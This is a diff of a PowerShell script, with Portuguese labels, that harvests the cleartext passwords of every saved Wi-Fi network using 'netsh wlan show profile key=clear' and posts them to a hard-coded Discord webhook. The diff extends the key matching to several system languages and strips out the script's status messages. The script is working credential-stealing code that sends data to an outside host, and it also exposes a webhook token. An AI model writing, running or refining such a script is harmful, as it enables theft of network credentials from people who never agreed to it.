@@ -1,51 +1,51 @@
 $Webhook="https://discord.com/api/webhooks/1391925819017793566/P6u2qHAbmqSFeu94T1beCpyWBO6khVVdCK66sy8a083xDZqRSyY5w5PDHDciVnh2ImDB"
+$profiles=netsh wlan show profile | ForEach-Object { ($_ -split ':')[1].Trim() } | Where-Object { $_ -ne "" }
 
-# Obter perfis Wi-Fi
-$profiles = netsh wlan show profile | Where-Object { $_ -match "All User Profile" } | ForEach-Object { ($_ -split ':')[1].Trim() }
-
-$embeds = @()
+$fields = @()
 
 foreach ($p in $profiles) {
-    $details = netsh wlan show profile name="$p" key=clear
-    $passLine = $details | Select-String "Key Content"
+    $details=netsh wlan show profile name="$p" key=clear
+    $passLine=$details | Select-String "Key Content|Contenuto chiave|Inhaltsschl|Contenido de la clave"
     
     if ($passLine) { 
-        $password = ($passLine -split ':')[1].Trim() 
+        $password=($passLine -split ':')[1].Trim() 
     } else { 
-        $password = 'Sem senha / não encontrado' 
+        $password='[Sem senha]' 
     }
     
-    # Criar um embed para cada rede
-    $embed = @{
-        title = "📶 Rede Wi-Fi: $p"
-        description = "**Senha:** `$password`"
-        color = 5814783
-        timestamp = Get-Date -Format "o"
+    $fields += @{
+        name = "📶 $p"
+        value = "**Senha:** ```$password```"
+        inline = $false
     }
-    
-    $embeds += $embed
 }
 
-# Se não encontrar redes
-if ($embeds.Count -eq 0) {
-    $embeds = @(@{
-        title = "❌ Nenhuma rede Wi-Fi encontrada"
-        description = "Não foram detectadas redes Wi-Fi salvas"
-        color = 16711680
-    })
+if ($fields.Count -eq 0) {
+    $fields = @(
+        @{
+            name = "❌ Nenhuma rede encontrada"
+            value = "Não foram detectadas redes Wi-Fi salvas"
+            inline = $false
+        }
+    )
+}
+
+$embed = @{
+    title = "🔍 Relatório de Redes Wi-Fi"
+    description = "Redes salvas neste dispositivo"
+    color = 3447003  # Cor azul
+    fields = $fields
+    footer = @{
+        text = "Total de redes: $($profiles.Count) | $(Get-Date -Format 'dd/MM/yyyy HH:mm')"
+    }
+    timestamp = Get-Date -Format "yyyy-MM-ddTHH:mm:ss.fffZ"
 }
 
 $payload = @{
-    embeds = $embeds
+    embeds = @($embed)
     username = "Wi-Fi Scanner"
     avatar_url = "https://cdn-icons-png.flaticon.com/512/284/284687.png"
 }
 
-try {
-    $body = $payload | ConvertTo-Json -Depth 10
-    Invoke-RestMethod -Uri $Webhook -Method Post -Body $body -ContentType "application/json"
-    Write-Host "✅ Relatório enviado com sucesso!" -ForegroundColor Green
-}
-catch {
-    Write-Host "❌ Erro: $($_.Exception.Message)" -ForegroundColor Red
-}
+$json = $payload | ConvertTo-Json -Depth 10
+Invoke-RestMethod -Uri $Webhook -Method Post -Body $json -ContentType "application/json"
